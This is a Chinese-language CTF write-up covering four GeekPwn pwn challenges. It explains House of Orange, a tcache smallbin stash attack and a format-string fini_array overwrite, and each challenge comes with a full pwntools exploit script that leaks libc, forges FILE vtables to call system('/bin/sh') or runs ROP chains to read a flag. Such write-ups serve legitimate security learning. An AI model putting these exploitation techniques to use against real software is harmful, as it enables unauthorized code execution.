# geekpwn-wp


春江潮水连海平，海上明月共潮生。			——《春江花月夜》张若虚

<!--more-->

# Babypwn

## House of orange分析

自古babypwn并不baby，但是这道题挺baby的，可惜刚好出在了我知识盲点上。通过这道题也算是学习理解了House of orange技术，不得不说这个技术还挺有趣的。

在讲解这道题这前，我先大概讲解一下House of orange技术，也算是一次知识总结。

House of orange技术主要用在堆块申请大小受限，如只能申请0-0x40大小的chunk，这样我们就不能使用fastbin来攻击malloc_hook了，或则是程序没有free功能，我们不能释放堆块。

先讲一讲后者，因为这种情况比较简单，house of orange利用的前提是程序存在堆溢出漏洞，我们可以利用堆溢出来修改TOP chunk的大小，但这个大小有一定的限制，要求TOP chunk是页对齐的，也就是topchunk的地址加topchunk的大小&0x1000必须是零。当我们篡改TOPchunk为一个较小值时（满足前面的要求），我们再申请一个TOPchunk不能分配的chunk，此时TOPchunk将会被释放到bin中，然后brk一个新的TOP chunk来分配。利用这样的原理，我们就释放了一个chunk，之后的攻击就简单了。我们主要讲一讲第一种情况的利用。

当我们申请的大小只有0-0x40，但是free可以使用时，我们就需要利用FILE结构里面的一个指针IO_list_all来实施攻击，该指针将FILE文件结构连成一个单项链表，通过该指针就可以遍历程序中存在的所有FILE结构。如果我们将IO_list_all篡改成我们可以控制的值，那么我们就可以伪造一个FILE结构，进而可以伪造vtable，大家都知道FILE的一些函数是通过vtable来调用的，我们控制了vtable也就控制了控制流。不过IO_list_all遍历FILE文件结构是需要别的操作来触发的，比如当malloc发生错误时会调用malloc_printerr，malloc_printerr会调用abort，abort会调用_IO_flush_all_lockp\_,IO_flush_all_lockp就会进行我们上面的一个遍历操作。这里总结一下这个调用链。

````c
libc_malloc => malloc_printerr() => __libc_message => abort() => _IO_flush_all_lockp => _IO_overflow_t
````

OK，我们现在来看看它是如何利用的。我们假设我们现在有一个0x91的堆块在unsorted bin中。现在我们把该堆块当成FILE文件结构，然后修改它的成员如下：

flags='/bin/sh',\_IO_read_ptr=0x61,\_IO_read_end=0,\_IO_read_base=io_list_all-0x10,\_IO_write_base=2,_IO_write_ptr=3。

当我们再分配一个堆块时会发生什么？

如我们分配一个0x20大小的chunk，由于unsorted bin中的堆块大小不等于0x20，所以其将会把0x61放入small bin中，而此时我们的bk时io_list_all-0x10，这里会发生一个unsorted bin攻击，将io_list_all指针修改为unsorted bin的地址。我们知道FILE结构中chain的偏移量是0x68，而unsorted bin的地址加0x68是small bin[4]，也就是0x59-0x68大小的small bin存储的地址。我们的0x60的堆块刚好就在这个范围内，这个时候small bin[4]的值将会被修改为0x61堆块的地址。

这个时候unsortedbin继续遍历将会发生错误，然后调用我们上面的调用链，在\_IO_flush_all_lockp时，其会根据io_list_all来遍历，由于其想要遍历得到stdout文件结构，正常情况下stdout遍历两次就可以得到，而我们现在修改了io_list_all为unsortedbin的地址，其遍历两次将会得到我们的0x61chunk。换而言之，我们的0x61chunk就被伪造成了stdout。

然后其会根据vtable指向的函数表查找_IO_overflow_t调用，并将FILE结构作为参数传递出去。如果将\_IO_over_flow_t修改为system，flags修改为‘/bin/sh’那么我们就可以获得shell了。所以我们只要再在0x61 chunk后面伪造一个vtable，当我们分配0x20大小堆块时就能获得shell了。

## EXP

明白了house of orange后，这道题就很简单了，程序有俩个漏洞，在show时没有没有检测输入数值是否小于0，存在整形溢出，可以泄漏出libc，在add时，由于可输入的字符是size-1，如果是0那么-1的无符号数将可以实现任意输入。但是程序堆块的大小限制在了0-0x50，所以我们不能用fast bin了，但是可以用house of orange。上面以及分析过house of orange了，这里就不再说原理了，EXP里面写了利用步骤注释，相信看了EXP后会对house of orange有更深入的理解。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote()
else:
	sh=process('./pwn')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def choice(elect):
	ru(':')
	sl(str(elect))

def add(name,size,descript):
	choice(1)
	ru(":")
	if len(name)==31:
		s(name)
	else:
		sl(name)
	ru(":")
	sl(str(size))
	ru(":")
	if len(descript)==size-1:
		s(descript)
	else:
		sl(descript)

def show(index):
	choice(3)
	ru(':')
	sl(str(index))

def delete(index):
	choice(2)
	ru(':')
	sl(str(index))

def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct

def exp():
	show(-5)
	ru(':')
	libc_base=u64(r(6).ljust(8,'\x00'))-0x3c5710
	io_list_all=libc_base+libc.symbols['_IO_list_all']
	system=libc_base+libc.symbols['system']
	info_addr("libc_base",libc_base)
	info_addr("system",system)
	add('a',0,'a')		#0
	add('b',0x10,'b')	#1
	add('c',0x40,'c')	#2
	add('d',0x40,'d')   #3
	add('e',0x40,'e')	#4
	delete(1)			#-1
	delete(0)			#-0
	add('f',1,'')		#0
	show(0)
	#1st leak heap
	ru("Description:")
	heap=u64(r(6).ljust(8,'\x00'))
	info_addr("heap",heap)
	#2st free to unsorted bin
	payload=p64(0)*3+p64(0xa1)
	add('g',0,payload)	#1
	delete(2)			#-2
	#3st attack io_list_all
	delete(1)			#-1
	payload=p64(0)*2
	payload+=pack_file_64(_flags=u64("/bin/sh\x00"),
		_IO_read_ptr=0x61,
		_IO_read_end=0,
		_IO_read_base=io_list_all-0x10,
		_IO_write_base=2,
		_IO_write_ptr=3)
	vtable=heap+0x100
	payload+=p64(vtable)
	payload+=p64(0)*2+p64(system)+p64(system)
	add('h',0,payload)
	debug()
	itr()

exp()
````

## Reference

[Geekpwn-wp-r3kaping](https://github.com/r3kapig/writeup/tree/master/20200714-geekpwn)

[house of orange 漏洞](http://blog.eonew.cn/archives/1093)

# PaperPrinter

这道题十分有趣，程序只能malloc两次，一次是print里面，还有一次是在自己写的exit函数中的strdup。并且程序自己随机化了一个区域供用户写，这个区域还可以被free，这就是说这块区域其实就是堆块，那么就很简单了，我们在这个区域布置堆块，并修改堆块的size，fd，bk等，来达到house of orange的条件，然后调用一次malloc来get shell。有趣的一点是，程序不能泄漏heap和libc，我们需要灵活的构造堆块来利用残留的数据写出我们的目的地址。libc的修改很简单，但是对于vtable的heap这点比较有趣。需要用到small bin的bk指针，而如何让chunk进入small bin呢？可以先将堆块free到unsorted bin中然后调用一次print来将其放入smallbin。

OK看EXP会更清晰，看一看构造的堆块结构大家就会明白了。

````python
#Author: Nopnoping
from pwn import *
import struct

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote()
else:
	sh=process('./pwn')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru(':')
	sl(str(elect))

def add(offset,length,content):
	choice(1)
	ru(':')
	sl(str(offset))
	ru(':')
	sl(str(length))
	ru(":")
	s(content)


def pwn_print():
	choice(3)

def delete(offset):
	choice(2)
	ru(':')
	sl(str(offset))

def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct

def exp():
	sleep_addr=int(r(5),16)
	info_addr("sleep",sleep_addr)
	#make chunk
	add(0,0x380,p64(0)+p64(0x1e1)+'\x00'*0x1d0+
				p64(0)+p64(0x21)+'\x00'*0x10+
				p64(0)+p64(0x91)+'\x00'*0x80+
				p64(0)+p64(0x21)+'\x00'*0x10+
				p64(0)+p64(0x91)+'\x00'*0x80+
				p64(0)+p64(0x21)+'\x00'*0x10+
				p64(0)+p64(0x21)+'\x00'*0x10)
	delete(0x10)
	delete(0x210)
	delete(0x2c0)
	#make bk
	pwn_print()
	io_list_all=(((sleep_addr&0xf0)-0x70)<<8)+0x520
	pack_io_list_all=struct.pack('<I',io_list_all-0x10)
	add(0x140,0x1a,'/bin/sh\x00'+p64(0x61)+p64(0)+pack_io_list_all[0]+pack_io_list_all[1])
	add(0x160,0x10,p64(2)+p64(3))
	system=(((sleep_addr&0xff0)-0x870)<<8)+0xa003a0
	pack_system=struct.pack("<I",system)
	add(0x2b0,0x1b,p64(0)*3+pack_system[0]+pack_system[1]+pack_system[2])
	choice(4)
	itr()

exp()
````

# EasyShell

字符串漏洞，可以袭击fini_array来getshell。观察finish函数可以得知其会先执行0x6D6830地址储存的函数，再执行0x6D6828地址储存的函数。同时我们发现rbp的值为0x6ed0c0，如果将0x6D6830储存leave_ret的地址，就可以实现栈迁移，我们再利用字符串漏洞在0x6ed0c8处写下ROP链，由于我们只能输入0xc0大小的字符，不能一次性将ROP链写完，可以分两次来写，第一次写read，第二次再写ROW。OK，思路就是这样，不过再写EXP时，需要注意我们输入的字符长度仅有0xc0大小，所以在利用字符串漏洞来修改地址时，小值优先，这样可以尽可能的缩短字符串长度。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote()
else:
	sh=process('./pwn')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def exp():
	fake_stack=0x6ed0c8
	fini_array=0x6D6830
	leave_ret=0x400DFC
	rdi_ret=0x401f0a
	rsi_ret=0x4014a4
	rdx_rsi_ret=0x44c499
	read=0x448F30
	open_=0x448ED0
	write=0x448F90
	offset=22

	payload="%"+str(0xa)+"c%"+str(offset+1)+"$hhn"
	payload+="%"+str(0x30-0xa)+"c%"+str(offset+7)+"$hhn"
	payload+="%"+str(0x99-0x30)+"c%"+str(offset+3)+"$hhn"
	payload+="%"+str(0xf8-0x99)+"c%"+str(offset+5)+"$hhn"
	payload+="%"+str(0xdfc-0xf8)+"c%"+str(offset)+"$hn"
	payload+="%"+str(0x401f-0xdfc)+"c%"+str(offset+2)+"$hn"
	payload+="%"+str(0x448f-0x401f)+"c%"+str(offset+8)+"$hn"
	payload+="%"+str(0x44c4-0x448f)+"c%"+str(offset+4)+"$hn"
	payload+="%"+str(0x6ed0-0x44c4)+"c%"+str(offset+6)+"$hn"
	payload=payload.ljust(0x70,'\x00')
	payload+=p64(fini_array)	#0xdfc 0
	payload+=p64(fake_stack)	#pop_rdi 0x0a 1
	payload+=p64(fake_stack+1)	#0x401f 2
	payload+=p64(fake_stack+0x10)	#pop_rdx_rsi 0x99 3
	payload+=p64(fake_stack+0x10+1) #0x44c4 4
	payload+=p64(fake_stack+0x20)	#rsi 0xf8 5
	payload+=p64(fake_stack+0x20+1)	#0x6ed0 6
	payload+=p64(fake_stack+0x28)	#read 0x30 7
	payload+=p64(fake_stack+0x28+1) #0x448f 8
	print hex(len(payload))
	sla("back.",payload)
	bss=0x0000000006F0000
	payload=p64(rdi_ret)+p64(0x6ed180)+p64(rsi_ret)+p64(0)+p64(open_)
	payload+=p64(rdi_ret)+p64(3)+p64(rdx_rsi_ret)+p64(0x100)+p64(bss)+p64(read)
	payload+=p64(rdi_ret)+p64(1)+p64(rdx_rsi_ret)+p64(0x100)+p64(bss)+p64(write)
	payload+="./flag\x00\x00"
	sleep(2)
	sl(payload)
	itr()

exp()
````

# PlayTheNew

题目存在一个UAF漏洞，但是限制了我们申请堆块大小，而且是用calloc来分配的，因此我们就不能袭击tcache和malloc_hook来获得shell。程序给了一次控制控制流的机会，当0x100000处的值不等于66时，将可以执行0x100010处的函数，同时0x100018作为其第一个参数。libc的版本是2.30，因此我们不能使用unsorted bin攻击来修改此处的值，那我们能使用什么呢？那就是tcache里面专有的small bin attack。

在有tcache的libc版本中，如果请求的大小在small bin范围内时，其从small bin中获得分配堆块后，还会将剩下的堆块放入tcache中，我们一起来看看源码。

````python
if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
````

在smallbin中获取一个堆块后，会判断是否为空以及tcache是否已满，如果不为空，tcache还没有满，那么就会将small bin中的chunk放入tcache中，而取chunk的过程并没有严格的检验，没有判断双链是否完整，因此如果我们篡改bk将可能达到任意地址修改的目的。

我们假设0x100大小的tcache中有6个空闲chunk，0x100大小的smallbin中有2个空闲chunk（A，B，B的fd指向表头），这个时候我们将A chunk的bk改成任意地址，那么在申请一个堆块时，B将会用于分配，而A会放入tcache中，当A放入后，tcache就满了，将不会再放入。同时由于A放入时，会将A->bk->fd=small bin，就实现了任意地址修改为libc的目的。

OK明白了small bin attack 之后，我们面临的难题就是如何写ORW链？我们仅有一次控制控制流的机会，如何利用这仅有的一次机会实现栈迁徙呢？

想要实现栈迁移我们首先需要修改rbp为我们可以控制的值，然后执行leave ret。而我们可以执行的函数可以控制rdi参数，如果能够找到一个片段有mov rbp，rdi相似的特征，我们就可以修改rbp，那么如何执行leave ret呢？就需要看我们找到的这个片段是否有call函数可以被我们控制的。在查找libc的片段中，我找到如下可以利用的gadget。

![image-20200721152547853](https://i.loli.net/2020/07/21/EchrAM52Btd9QHu.png)

rdi是我们可以控制的值，因此rbp我们也可以控制，所以call我们就也可以控制了，我们修改rbp，并且控制call调用leave；ret片段来实现栈迁移，进而执行我们的ORW链。

OK思路如上所诉，EXP见下。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote()
else:
	sh=process('./pwn')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru('>')
	sl(str(elect))

def add(index,size,content):
	choice(1)
	ru(':')
	sl(str(index))
	ru(':')
	sl(str(size))
	ru(':')
	sl(content)

def edit(index,content):
	choice(4)
	ru(':')
	sl(str(index))
	ru(':')
	sl(content)

def show(index):
	choice(3)
	ru(':')
	sl(str(index))

def delete(index):
	choice(2)
	ru(':')
	sl(str(index))

def exp():
	libc=ELF("./libc-2.29.so")
	add(0,0x200,'a')
	add(1,0x200,'b')
	add(2,0x200,'c')
	add(3,0xf0,'d')
	for i in range(6):
		delete(0)
		edit(0,p64(0)*2)
	for i in range(6):
		delete(3)
		edit(3,p64(0)*2)
	delete(0)
	show(0)
	ru(":")
	heap_base=u64(r(6).ljust(8,'\x00'))
	info_addr("heap_base",heap_base)
	edit(0,p64(0)*2)
	delete(0)
	show(0)
	ru(":")
	libc_base=u64(r(6).ljust(8,'\x00'))-0x3b3ca0
	info_addr("libc_base",libc_base)
	add(1,0x100,'e')
	delete(2)
	add(1,0x100,'e')
	add(1,0x200,'e')
	edit(2,p64(0)*32+p64(0)+p64(0x101)+p64(heap_base+0x100)+p64(0x100000-0x10))
	add(0,0xf0,'e')
	stack=0x100020
	magic=libc_base+0x71F5E
	leave_ret=libc_base+0x45CEE
	rdi_ret=libc_base+0x219a0
	rsi_ret=libc_base+0x24395
	rdx_ret=libc_base+0x1b9a
	rax_ret=libc_base+0x37f08
	pop3=libc_base+0x2199b
	flag=0x100110
	syscall=libc_base+0xC1A75
	mprotect=libc_base+libc.symbols['mprotect']
	read=libc_base+libc.symbols['read']
	addr=(heap_base>>24)<<24
	payload=p64(0)+p64(magic)+p64(stack-0x98)+p64(stack)+p64(pop3)+p64(0)+p64(0)
	payload+=p64(leave_ret)
	payload+=p64(rax_ret)+p64(2)+p64(rdi_ret)+p64(flag)+p64(rsi_ret)+p64(0)+p64(syscall)
	payload+=p64(rax_ret)+p64(0)+p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(flag)+p64(rdx_ret)+p64(0x100)+p64(syscall)
	payload+=p64(rax_ret)+p64(1)+p64(rdi_ret)+p64(1)+p64(rsi_ret)+p64(flag)+p64(rdx_ret)+p64(0x100)+p64(syscall)
	payload+='./flag\x00'
	choice(5)
	sla(":",payload)
	choice(0x666)
	itr()

exp()
````


